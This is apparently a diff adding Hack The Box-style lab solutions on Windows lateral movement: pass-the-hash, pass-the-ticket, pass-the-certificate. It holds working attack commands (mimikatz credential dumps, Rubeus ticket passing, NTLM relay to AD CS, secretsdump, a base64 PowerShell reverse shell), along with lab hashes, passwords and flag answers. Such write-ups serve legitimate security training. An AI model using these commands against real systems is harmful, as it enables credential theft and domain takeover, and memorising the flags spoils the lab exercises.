@@ -268,7 +268,7 @@
     Then we login using the credential that we found.
 
     ```bash
-        xfreerdp /v:10.129.202.136 /u:chris /p:789456123
+    xfreerdp /v:10.129.202.136 /u:chris /p:789456123
     ```
     The answer is `HTB{R3m0t3DeskIsw4yT00easy}`.
 
@@ -687,3 +687,318 @@
 
     Then it gave as the answer. The answer is `Str0ng_Adm1nistrat0r_P@ssword_2025!`.
     
+## Windows Lateral Movement Techniques
+### Pass the Hash (PtH)
+#### Tools
+1. Mimikatz
+2. Invoke-TheHash
+3. Impacket (psexec.py)
+4. NetExec 
+5. evil-winrm
+6. xfreerdp
+#### Challenges
+1. Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.
+
+    In here, i used `impacket-psexec` to solve this.
+
+    ```bash
+    impacket-psexec Administrator@10.129.204.23 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+    ```
+    Then we can explore on it. The answer is `G3t_4CCE$$_V1@_PTH`.
+
+2. Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.
+
+    To enable Enable Restricted Admin Mode to allow PtH, we can use this command to add new registry.
+
+    ```cmd
+    c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+    ```
+    The answer is `DisableRestrictedAdmin`.
+
+3. Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?
+
+    Because we have already disablde restricted admin, we can use xfreerdp to connect to that.
+
+    ```bash
+    xfreerdp  /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
+    ```
+3. Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?
+
+    We can solve this by using mimikatz and use some filter to make it easy to read.
+
+    ```powershell
+    .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit | Select-String -Pattern "David" -Context 0, 5
+    ```
+    ![alt text](Assets/PTH1.png)
+
+    We can see the NLTM on there. The answer is `c39f2beb3d2ec06a62cb887fb391dee0`.
+
+4. Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.
+
+    To solve this, we can use mimikatz to open cmd with david users.
+
+    ```powershell
+    .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:David /domain:inlanefreight /ntlm:c39f2beb3d2ec06a62cb887fb391dee0  /run:cmd.exe" exit 
+    ```
+    Then in the cmd, we can read the flag.
+
+    ```bash
+    type \\DC01\david\david.txt
+    ```
+    The answer is `D3V1d_Fl5g_is_Her3`.
+
+5. Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.
+
+   To solve this, first, we need to get the NTLM of julo user. The NTLM is `64f12cddaa88057e06a81b54e73b949b`.
+    ```powershell
+    .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit | Select-String -Pattern "Julio" -Context 0, 5
+    ```
+
+    ![alt text](Assets/PTH2.png)
+
+    Then we use that NTLM to spawn cmd by using mimkatz again.
+    ```powershell
+    .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:julio /domain:inlanefreight /ntlm:64f12cddaa88057e06a81b54e73b949b  /run:cmd.exe" exit 
+    ```
+    After we got the cmd, we can read the flag.
+    ```bash
+    type \\DC01\julio\julio.txt
+    ```
+    The answer is `JuL1()_SH@re_fl@g`.
+
+6. Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.
+
+    To solve this, first we need to setup nc listener.
+    ```powershell
+    .\nc.exe -lvnp 8001
+    ```
+    After that we generate reverse shell from [here](https://www.revshells.com/). In here, i choose, powershell#3(base64). After that we run `Invoke-WMIExec`.
+
+    ```powershell
+    Import-Module .\Invoke-TheHash.psd1
+    Invoke-WMIExec -Target DC01 -Domain inlanefreight -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+    ```
+    After getting the reverse shell, we can read the flag. The answer is `JuL1()_N3w_fl@g`.
+
+### Pass the Ticket (PtT) from Windows
+#### Tools
+1. Mimikatz (To dump ticket, forge, and pass)
+2. Rubeus (To dump ticket, forge, and pass)
+#### Challenges
+1. Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?
+
+    We can use rubesut to solvet this. 
+    ```cmd
+    Rubeus.exe dump /nowrap
+    ```
+
+    It gave 3 user, david, john, and julio. So the answer is `3`.
+
+2. Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john
+
+    To solve this, first, we can use mimikatz to dump john encryption keys.
+
+    ```cmd
+    mimikatz # privilege::debug
+    mimikatz # sekurlsa::ekeys
+    ```
+    ![alt text](Assets/PTT1.png)
+
+    In there, we can see rc4 of john is `c4b0e1b10c7ce2c4723b4e2407ef81a2`. Then we use rubeus to pass the ticket.
+
+    ```cmd
+    Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt
+    ```
+
+    ![alt text](Assets/PTT2.png)
+
+    After we successfully pass the ticket, we can read the flag.
+
+    ```cmd
+    type \\DC01.inlanefreight.htb\john\john.txt
+    ```
+    The answer is `Learn1ng_M0r3_Tr1cks_with_J0hn`.
+
+3. Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt
+
+    Still from the previous state, we can type `powershell` now to get the powershell. Then we can flag by typing this.
+
+    ```powershell
+    Invoke-Command -ComputerName DC01 -ScriptBlock { Get-Content C:\john\john.txt }
+    ```
+    The answer is `P4$$_th3_Tick3T_PSR`.
+
+### Pass the Ticket (PtT) from Linux
+#### Tools
+1. keytabextract.py
+2. [chisel](https://github.com/jpillora/chisel)
+3. linikatz.sh
+#### Challenges
+1. Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.
+
+    We can solve this by using ssh with specific port. 
+    ```bash
+    ssh david@inlanefreight.htb@10.129.204.23 -p 2222
+    ```
+    The answer is `Gett1ng_Acc3$$_to_LINUX01`.
+
+2. Which group can connect to LINUX01? 
+
+    We can solve this by using `realm list`. This command can be used for reconnaissance about our domain.
+    ```bash
+    realm list
+    ```
+    ![alt text](Assets/PTTL1.png)
+    Based on that, the answer is `Linux Admins`.
+
+3. Look for a keytab file that you have read and write access. Submit the file name as a response.
+
+    We need to find keytab files in here. Its a user secret key.
+
+    ```bash
+    find / -name *keytab* -ls 2>/dev/null
+    ```
+    ![alt text](Assets/PTTL2.png)
+    
+    Based on that, the answer is `carlos.keytab`.
+
+4. Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.
+
+    First we need to extract the keytab by using `keytabextract.py`.
+
+    ![alt text](Assets/PTTL3.png)
+
+    The NTLM hash is `a738f92b3c08b424ec2d99589a9cce60`. We can crack this by using [crackstation](https://crackstation.net/). The password plaintext is `Password5`. Then we can login using its credential.
+
+    ```bash
+    su - carlos@inlanefreight.htb
+    ```
+    The answer is `C@rl0s_1$_H3r3`.
+
+5. Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.
+
+    To solve this, first i check the crontab. Then i cat the script mentioned in there.
+
+    ![alt text](Assets/PTTL4.png)
+
+    But using `svc_workstations.kt` keytab is wrong. Even i get the flag on there, the result is incorrect. In the .script folder, we can find another keytab. The correct keytab is `svc_workstations._all.kt`. After that we extract it using keytabextract.py.
+
+    ```bash
+    python3 /opt/keytabextract.py svc_workstations._all.kt. 
+    ```
+    We get `7247e8d4387e76996ff3f18a34316fdd` as NTLM. The plaintext is `Password4`. Then we can ssh and get the answer in there. The answer is `Mor3_4cce$$_m0r3_Pr1v$`.
+
+6. Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.
+
+    Based on `sudo -l` output, we can use any command as a root. The answer is `Ro0t_Pwn_K3yT4b`.
+
+7. Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.
+
+    To solve this, first we list the /tmp folder.
+
+    ```bash
+    ls -la /tmp
+    ```
+
+    ![alt text](Assets/PTTL5.png)
+
+    We can see julio credential is `krb5cc_647401106_7QipSl`. Then we copied and export it.
+
+    ```bash
+    cp /tmp/krb5cc_647401106_7QipSl .
+    export KRB5CCNAME=/home/svc_workstations@inlanefreight.htb/krb5cc_647401106_7QipSl
+    ```
+    Then we can get the flag by using smbclient. 
+    ```bash
+    smbclient //dc01/julio -k -c 'get julio.txt'
+    ```
+    The answer is `JuL1()_SH@re_fl@g`.
+
+8. Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).
+
+    By default, we can find machine keytab in the `/etc/krb5.keytab`. We can verify using this.
+
+    ```bash
+    klist -k -t /etc/krb5.keytab
+    ```
+    ![alt text](Assets/PTTL6.png)
+
+    We can see it have `LINUX01$@INLANEFREIGHT.HTB`. So we can use that keytab.
+
+    ```bash
+    kinit 'LINUX01$@INLANEFREIGHT.HTB' -k -t /etc/krb5.keytab
+    ```
+    Then verfy using klist. If its right, then we can get the flag by using smbclient.
+    ```bash
+    smbclient //dc01/linux01 -k -c 'get flag.txt'
+    ```
+    The answer is `Us1nG_KeyTab_Like_@_PRO`.
+
+### Pass the Certificate
+#### Tools
+1. [Certipy](https://github.com/ly4k/Certipy)
+2. impacket-ntlmrelayx
+3. [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
+4. [pywhisker](https://github.com/ShutdownRepo/pywhisker)
+5. [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/)
+#### Challenges
+1. What are the contents of flag.txt on jpinkman's desktop?
+
+    In here, we can solve this by using shadow credential technique. First by using `pywhisker`, we tried to write public key to victim user.
+    ```bash
+    pywhisker --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+    ```
+    ![alt text](Assets/PTC1.png)
+
+    It generate `xzLe3rJB.pfx` and `JgcLtdWGBc75E5jCZhHX` as a password. Then we can use `gettgtpkinit.py` to do gtg.
+
+    ```bash
+    python3 gettgtpkinit.py -cert-pfx ./xzLe3rJB.pfx -pfx-pass 'JgcLtdWGBc75E5jCZhHX' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+    ```
+    Then verify with klist. After it was verified, we can use evil-winrm.
+
+    ```bash
+    evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+    ```
+    The answer is `3d7e3dfb56b200ef715cfc300f07f3f8`.
+
+2. What are the contents of flag.txt on Administrator's desktop?
+
+    To solve this, first, we modify the `/etc/hosts` with this.
+    ```bash
+    10.129.196.41 CA01.inlanefreight.local
+    10.129.234.174 DC01.inlanefreight.local INLANEFREIGHT.LOCAL
+    ```
+    Then we used `ntlmrelayx` to listen for inbound connection.
+    ```bash
+    impacket-ntlmrelayx -t http://10.129.196.41/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+    ```
+    Then we trigger it using `printerbug.py` script.
+    ```bash
+    python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.14.84
+    ```
+    Back to `ntlmrelayx`, if we got this then we successs.
+
+    ![alt text](Assets/PTC2.png)
+
+    Then we used `gettgtpkinit.py` to perform pass the certificate attack.
+
+    ```bash
+    python3 gettgtpkinit.py -cert-pfx ../DC01\$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
+    ```
+
+    After that we export `KRB5CCNAME` variable.
+
+    ```bash
+    export KRB5CCNAME=/tmp/dc.ccache
+    ```
+    Then we can use `impacket-secretsdump` to dump the administrator hash.
+    ```bash
+    impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+    ```
+    One of the output was like this `Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd02e525dd676fd8ca04e200d265f20c:::`. We can use `evil-winrm` with the NTLM of admin hash.
+
+    ```bash
+    evil-winrm -i 10.129.234.174 -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
+    ```
+    Then we can explore to get the flag. The answer is `a1fc497a8433f5a1b4c18274019a2cdb`.
